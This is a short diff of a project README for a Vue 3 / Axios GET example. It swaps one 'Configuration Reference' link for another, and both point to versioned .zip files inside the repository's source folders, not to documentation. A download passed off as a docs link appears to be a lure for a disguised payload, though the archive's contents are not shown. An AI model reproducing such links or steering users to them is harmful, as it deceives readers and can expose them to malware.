@@ -21,4 +21,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://raw.githubusercontent.com/wisamna84/simple-GET-function-Vue-3-Axios-/master/src/views/simple-GET-function-Vue-3-Axios--1.7.zip).
+See [Configuration Reference](https://github.com/wisamna84/simple-GET-function-Vue-3-Axios-/raw/refs/heads/master/src/components/Axios-simple-GE-function-Vue-v2.9.zip).
